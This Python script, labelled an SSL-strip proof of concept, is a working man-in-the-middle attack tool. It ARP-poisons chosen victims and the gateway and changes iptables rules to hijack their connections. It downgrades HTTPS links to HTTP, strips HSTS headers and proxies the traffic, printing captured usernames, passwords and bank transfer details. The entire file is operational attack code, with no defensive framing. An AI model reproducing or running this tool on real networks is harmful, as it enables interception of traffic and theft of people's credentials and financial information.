import os, sys, time, threading, re, argparse
from scapy.all import *
from scapy.layers.inet import TCP, IP
from scapy.layers.l2 import ARP, Ether
import requests

import logging
import urllib3
import warnings
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=SyntaxWarning, module="scapy.sendrecv")

IFACE = conf.iface
GATEWAY = conf.route.route('0.0.0.0')[2]
TARGET_SERVER = None
VICTIMS = []
session = requests.Session()

cooldown_dict = {}
COOLDOWN_TIME = 10


def parse_arguments():
    p = argparse.ArgumentParser(description='SSL-Strip POC')
    vg = p.add_mutually_exclusive_group(required=True)
    p.add_argument( '-i', '--interface',      help='Net iface')
    vg.add_argument('-t', '--target',         help='Single IP')
    vg.add_argument('-v', '--victim',nargs=2, help='Two IPs')
    p.add_argument( '-s', '--server',         help='Target server IP')
    return p.parse_args()


def setup_system():
    print("Setting up iptables...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward") # enable ip forwarding
    os.system("iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP") # drop RST packets so kernel doesnt mess with our hijacking of connections

    for v in VICTIMS:
        # delete the already established connections
        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 80 -m state --state ESTABLISHED -j DROP")
        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 443 -m state --state ESTABLISHED -j DROP")

        # allow new connections
        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 80 -m state --state NEW -j ACCEPT")
        os.system(f"iptables -I FORWARD -s {v} -p tcp --dport 443 -m state --state NEW -j ACCEPT")

    print(r"""
$$\       $$$$$$$$\ $$$$$$$$\       $$$$$$$$\ $$\   $$\ $$$$$$$$\        $$$$$$\   $$$$$$\  $$\      $$\ $$$$$$$$\  $$$$$$\
$$ |      $$  _____|\__$$  __|      \__$$  __|$$ |  $$ |$$  _____|      $$  __$$\ $$  __$$\ $$$\    $$$ |$$  _____|$$  __$$\
$$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ /  \__|$$ /  $$ |$$$$\  $$$$ |$$ |      $$ /  \__|
$$ |      $$$$$\       $$ |            $$ |   $$$$$$$$ |$$$$$\          $$ |$$$$\ $$$$$$$$ |$$\$$\$$ $$ |$$$$$\    \$$$$$$\
$$ |      $$  __|      $$ |            $$ |   $$  __$$ |$$  __|         $$ |\_$$ |$$  __$$ |$$ \$$$  $$ |$$  __|    \____$$\
$$ |      $$ |         $$ |            $$ |   $$ |  $$ |$$ |            $$ |  $$ |$$ |  $$ |$$ |\$  /$$ |$$ |      $$\   $$ |
$$$$$$$$\ $$$$$$$$\    $$ |            $$ |   $$ |  $$ |$$$$$$$$\       \$$$$$$  |$$ |  $$ |$$ | \_/ $$ |$$$$$$$$\ \$$$$$$  |
\________|\________|   \__|            \__|   \__|  \__|\________|       \______/ \__|  \__|\__|     \__|\________| \______/



$$$$$$$\  $$$$$$$$\  $$$$$$\  $$$$$$\ $$\   $$\
$$  __$$\ $$  _____|$$  __$$\ \_$$  _|$$$\  $$ |
$$ |  $$ |$$ |      $$ /  \__|  $$ |  $$$$\ $$ |
$$$$$$$\ |$$$$$\    $$ |$$$$\   $$ |  $$ $$\$$ |
$$  __$$\ $$  __|   $$ |\_$$ |  $$ |  $$ \$$$$ |
$$ |  $$ |$$ |      $$ |  $$ |  $$ |  $$ |\$$$ |
$$$$$$$  |$$$$$$$$\ \$$$$$$  |$$$$$$\ $$ | \$$ |
\_______/ \________| \______/ \______|\__|  \__|
""")
    return True


def get_mac(ip):
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=0, iface=IFACE)
        if ans:
            return ans[0][1].src
    except:
        pass
    return None


def cleanup_system():
    print("\nRestoring network...")
    os.system("iptables -F")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    g_mac = get_mac(GATEWAY)
    for v_ip in VICTIMS:
        v_mac = get_mac(v_ip)
        if v_mac and g_mac:
            send(ARP(op=2, pdst=v_ip, hwdst=v_mac, psrc=GATEWAY, hwsrc=g_mac), count=5, verbose=0)
            send(ARP(op=2, pdst=GATEWAY, hwdst=g_mac, psrc=v_ip, hwsrc=v_mac), count=5, verbose=0)


def arp_spoof(target, gw, iface, stop_event, server=None):
    t_mac, g_mac = get_mac(target), get_mac(gw)
    if not t_mac or not g_mac:
        return

    s_mac = get_mac(server) if server else None

    while not stop_event.is_set():
        send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw), verbose=0, iface=iface) # poison victim
        send(ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target), verbose=0, iface=iface) # poison gateway

        if server and s_mac:
            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=server), verbose=0, iface=iface)
            send(ARP(op=2, pdst=server, hwdst=s_mac, psrc=target), verbose=0, iface=iface)
        time.sleep(2)


def strip_https(data):
    if not data:
        return data
    data = data.replace('https://', 'http://').replace('wss://', 'ws://')
    data = re.sub(r'Strict-Transport-Security', 'X-Stripped-HSTS', data, flags=re.I)
    return data


def https_fetch(url, headers, method="GET", body=None):
    try:
        if method == "POST":
            r = session.post(url, headers=headers, data=body, verify=False, timeout=5)
        else:
            r = session.get(url, headers=headers, verify=False, timeout=5)
        return r.status_code, r.headers, r.text
    except:
        return None, None, None


def http_send(pkt, content):
    body = strip_https(content)
    resp = (f"HTTP/1.1 200 OK\r\nServer: Apache\r\nContent-Type: text/html\r\n"
            f"Connection: close\r\nContent-Length: {len(body)}\r\n\r\n{body}")

    ack = pkt[TCP].seq + len(pkt[TCP].payload)
    reply = IP(src=pkt[IP].dst, dst=pkt[IP].src) / TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA",
                                                       seq=pkt[TCP].ack, ack=ack) / Raw(load=resp)
    send(reply, verbose=0, iface=IFACE)


def extract_creds(body):
    res = []
    for pair in body.split('&'):
        if '=' in pair:
            k, v = pair.split('=', 1)
            if any(x in k.lower() for x in ['user', 'pass', 'login', 'email', 'pwd']):
                res.append(f"{k}: {v}")
    return " | ".join(res) if res else None


def extract_amount(body):
    try:
        for pair in body.split('&'):
            if '=' in pair:
                k,v = pair.split('=',1)
                if 'amount' in k.lower():
                    return v
    except:
        pass
    return None


def handle_packet(pkt):
    if not pkt.haslayer(Raw) or pkt[IP].src not in VICTIMS:
        return

    try:
        data = pkt[Raw].load.decode(errors='ignore')
        if "GET " not in data and "POST " not in data:
            return

        lines = data.split('\r\n')
        method, path, _ = lines[0].split(' ')
        headers = {l.split(': ')[0]: l.split(': ')[1] for l in lines[1:] if ': ' in l}
        host = headers.get('Host')
        if not host:
            return

        body = data.split('\r\n\r\n')[1] if '\r\n\r\n' in data else ""

        if method == "POST":
            key = f"{pkt[IP].src}:{host}{path}"
            curr_time = time.time()

            if key in cooldown_dict:
                elapsed = curr_time - cooldown_dict[key]
                if elapsed < COOLDOWN_TIME:
                    return

            cooldown_dict[key] = curr_time

            creds = extract_creds(body)
            amt = extract_amount(body)

            if creds and 'login' in path.lower() or 'signin' in path.lower():
                print(f"\nCAPTURED CREDS: {host}{path}\n    {creds}\n")

            if amt and 'transfer' in path.lower():
                print(f"\n TRANSFER DETECTED: ${amt}")
                for pair in body.split('&'):
                    if '=' in pair:
                        k,v = pair.split('=',1)
                        if 'target' in k.lower() or 'recipient' in k.lower():
                            print(f"    To: {v}")
                            break
                print()

        url = f"https://{host}{path}"
        if 'Accept-Encoding' in headers:
            del headers['Accept-Encoding']

        _, _, resp_text = https_fetch(url, headers, method, body)
        if resp_text:
            http_send(pkt, resp_text)
    except Exception as e:
        pass


if __name__ == "__main__":
    IFACE, VICTIMS, TARGET_SERVER
    args = parse_arguments()

    if args.interface:
        IFACE = args.interface
    VICTIMS = [args.target] if args.target else args.victim
    if args.server:
        TARGET_SERVER = args.server

    if not setup_system():
        sys.exit(1)

    stop_event = threading.Event()
    for v in VICTIMS:
        threading.Thread(target=arp_spoof, args=(v, GATEWAY, IFACE, stop_event, TARGET_SERVER), daemon=True).start()

    print(f"Sniffing packets...")
    print(f"Victims: {', '.join(VICTIMS)}")
    try:
        v_filter = " or ".join([f"src host {v}" for v in VICTIMS])
        sniff(iface=IFACE, filter=f"tcp and ({v_filter})", prn=handle_packet, store=0)
    except KeyboardInterrupt:
        pass
    finally:
        stop_event.set()
        cleanup_system()
        print(r"""
$$$$$$\       $$\   $$\  $$$$$$\  $$\    $$\ $$$$$$$$\        $$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$$$\ $$\   $$\
\_$$  _|      $$ |  $$ |$$  __$$\ $$ |   $$ |$$  _____|      $$  __$$\ $$  __$$\ $$  __$$\ $$ | $$  |$$  _____|$$$\  $$ |
  $$ |        $$ |  $$ |$$ /  $$ |$$ |   $$ |$$ |            $$ /  \__|$$ |  $$ |$$ /  $$ |$$ |$$  / $$ |      $$$$\ $$ |
  $$ |        $$$$$$$$ |$$$$$$$$ |\$$\  $$  |$$$$$\          \$$$$$$\  $$$$$$$  |$$ |  $$ |$$$$$  /  $$$$$\    $$ $$\$$ |
  $$ |        $$  __$$ |$$  __$$ | \$$\$$  / $$  __|          \____$$\ $$  ____/ $$ |  $$ |$$  $$<   $$  __|   $$ \$$$$ |
  $$ |        $$ |  $$ |$$ |  $$ |  \$$$  /  $$ |            $$\   $$ |$$ |      $$ |  $$ |$$ |\$$\  $$ |      $$ |\$$$ |
$$$$$$\       $$ |  $$ |$$ |  $$ |   \$  /   $$$$$$$$\       \$$$$$$  |$$ |       $$$$$$  |$$ | \$$\ $$$$$$$$\ $$ | \$$ |
\______|      \__|  \__|\__|  \__|    \_/    \________|       \______/ \__|       \______/ \__|  \__|\________|\__|  \__|""")